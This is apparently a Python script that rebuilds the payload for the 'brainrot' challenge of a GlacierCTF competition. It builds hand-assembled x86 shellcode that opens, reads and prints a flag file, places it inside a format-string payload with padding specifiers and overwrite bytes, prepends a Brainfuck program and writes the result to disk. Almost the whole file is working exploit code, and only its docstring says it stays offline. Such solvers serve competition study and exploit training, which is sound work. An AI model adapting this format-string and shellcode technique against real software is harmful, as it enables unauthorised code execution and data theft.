#!/usr/bin/env python3
"""Offline reconstruction of the GlacierCTF brainrot payload builder.

Derived from the participant's archived brainrot_solve_reconstructed.py.
The original solver was lost. This file writes payload bytes only: it does
not connect to the historical CTF server or execute SWEB/QEMU.
"""
import argparse
import hashlib
import struct
from pathlib import Path

BASE_IN = 0x08025A80

def shellcode(path_address: int) -> bytes:
    code = (
        b"\x31\xc0\xb0\x05" + b"\xbb" + struct.pack("<I", path_address)
        + b"\x6a\x01\x59\xcd\x80"
        + b"\x89\xc3\x31\xc0\xb0\x03"
        + b"\xb9" + struct.pack("<I", BASE_IN)
        + b"\x6a\x7f\x5a\xcd\x80"
        + b"\x31\xc0\xb0\x04\x6a\x01\x5b"
        + b"\xb9" + struct.pack("<I", BASE_IN)
        + b"\x6a\x7f\x5a\xcd\x80"
        + b"\x31\xc0\xb0\x01\x31\xdb\xcd\x80"
    )
    if len(code) > 56:
        raise ValueError("shellcode exceeds allocated slot")
    return code.ljust(56, b"\x90")

def build(path: bytes = b"/usr/flag") -> bytes:
    def fmt(path_addr: int) -> bytes:
        return (
            b"%0256u%0119u" + shellcode(path_addr)
            + b"%c%c%c"
            + b"\x47\xff\xff\xff\xff\x7f"
            + b"%c%c%s"
            + b"\x7a\xff\xff\xff\xff\x7f"
            + b"%c%c" + b"\x90" * 32 + b"\x3d\x17"
        )
    path_addr = BASE_IN + len(fmt(0x41414141)) + 1
    fake_stdin = fmt(path_addr) + b"\0" + path + b"\0"
    bf_program = (b",." * 512 + b",").ljust(1280, b"Z")
    return bf_program + b"\n" + fake_stdin + b"\n"

def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--path", default="/usr/flag")
    parser.add_argument("--output", default="brainrot_payload")
    args = parser.parse_args()
    payload = build(args.path.encode())
    Path(args.output).write_bytes(payload)
    print("Wrote", len(payload), "bytes to", args.output)
    print("SHA-256", hashlib.sha256(payload).hexdigest())

if __name__ == "__main__":
    main()
